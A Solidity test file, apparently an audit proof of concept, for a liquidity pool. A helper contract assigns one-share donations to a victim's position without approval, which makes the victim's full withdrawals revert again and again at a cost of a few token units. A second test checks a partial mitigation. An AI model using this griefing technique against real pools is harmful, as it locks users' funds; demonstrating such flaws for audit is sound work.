// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolModifyLiquidityTest} from "./MetricOmmPool.modifyLiquidity.t.sol";
import {IMetricOmmPoolActions} from "../contracts/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "../contracts/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {
  IMetricOmmModifyLiquidityCallback
} from "../contracts/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {LiquidityDelta} from "../contracts/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/// @dev Pays for liquidity while assigning the newly minted shares to an arbitrary owner.
contract OnBehalfShareDonor is IMetricOmmModifyLiquidityCallback {
  using SafeERC20 for IERC20;

  function donate(address pool, address owner, uint80 salt, LiquidityDelta memory deltas)
    external
    returns (uint256 amount0Added, uint256 amount1Added)
  {
    return IMetricOmmPoolActions(pool).addLiquidity(owner, salt, deltas, "", "");
  }

  function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata)
    external
    override
  {
    PoolImmutables memory immutables = IMetricOmmPool(msg.sender).getImmutables();
    if (amount0Delta != 0) IERC20(immutables.token0).safeTransfer(msg.sender, amount0Delta);
    if (amount1Delta != 0) IERC20(immutables.token1).safeTransfer(msg.sender, amount1Delta);
  }
}

contract OnBehalfShareDonationAuditTest is MetricOmmPoolModifyLiquidityTest {
  int8 internal constant TARGET_BIN = 4;

  OnBehalfShareDonor internal donor;

  function setUp() public override {
    super.setUp();
    donor = new OnBehalfShareDonor();
    token0.mint(address(donor), 1e18);
    token1.mint(address(donor), 1e18);
  }

  function test_permissionlessDonationCanRepeatedlyRevertFullWithdrawal() public {
    address victimPositionOwner = address(callers[USER_INDEX]);

    // The victim opens the smallest valid position. Any nonzero remainder below
    // MINIMAL_MINTABLE_LIQUIDITY makes removeLiquidity revert.
    _doAddLiquidity(
      USER_INDEX, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, MINIMAL_MINTABLE_LIQUIDITY)
    );
    assertEq(
      _getPositionBinShares(victimPositionOwner, DEFAULT_SALT, TARGET_BIN),
      MINIMAL_MINTABLE_LIQUIDITY
    );

    uint256 donorBalanceBefore = token0.balanceOf(address(donor));

    // The attacker sees a full-withdrawal transaction and assigns one new share
    // to the victim's position. No victim signature or approval is required.
    donor.donate(
      address(pool), victimPositionOwner, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, 1)
    );

    vm.expectRevert(
      abi.encodeWithSelector(
        IMetricOmmPoolActions.MinimalLiquidity.selector, 1, MINIMAL_MINTABLE_LIQUIDITY
      )
    );
    _doRemoveLiquidity(
      USER_INDEX, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, MINIMAL_MINTABLE_LIQUIDITY)
    );

    // The victim refreshes the share count and retries a full withdrawal. A
    // second one-share donation invalidates the new amount in exactly the same way.
    donor.donate(
      address(pool), victimPositionOwner, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, 1)
    );
    vm.expectRevert(
      abi.encodeWithSelector(
        IMetricOmmPoolActions.MinimalLiquidity.selector, 1, MINIMAL_MINTABLE_LIQUIDITY
      )
    );
    _doRemoveLiquidity(
      USER_INDEX, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, MINIMAL_MINTABLE_LIQUIDITY + 1)
    );

    uint256 donorCost = donorBalanceBefore - token0.balanceOf(address(donor));
    emit log_named_uint("attacker cost for two invalidated withdrawals (token0 raw units)", donorCost);
    emit log_named_uint(
      "victim shares still locked",
      _getPositionBinShares(victimPositionOwner, DEFAULT_SALT, TARGET_BIN)
    );

    // In this ordinary 18-decimal fixture, each donated share costs one raw token unit.
    assertEq(donorCost, 2);
    assertEq(
      _getPositionBinShares(victimPositionOwner, DEFAULT_SALT, TARGET_BIN),
      MINIMAL_MINTABLE_LIQUIDITY + 2
    );
  }

  function test_largerPositionCanOnlyBoundTheAttackByLeavingTheMinimumBehind() public {
    address victimPositionOwner = address(callers[USER_INDEX]);
    uint104 initialShares = MINIMAL_MINTABLE_LIQUIDITY * 10;

    _doAddLiquidity(USER_INDEX, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, initialShares));
    donor.donate(
      address(pool), victimPositionOwner, DEFAULT_SALT, _createDeltaArray(TARGET_BIN, 1)
    );

    // Leaving exactly the minimum is robust against the donation and unlocks
    // most of a larger position, but the final minimum-sized position remains griefable.
    _doRemoveLiquidity(
      USER_INDEX,
      DEFAULT_SALT,
      _createDeltaArray(TARGET_BIN, initialShares - MINIMAL_MINTABLE_LIQUIDITY)
    );
    assertEq(
      _getPositionBinShares(victimPositionOwner, DEFAULT_SALT, TARGET_BIN),
      MINIMAL_MINTABLE_LIQUIDITY + 1
    );
  }
}
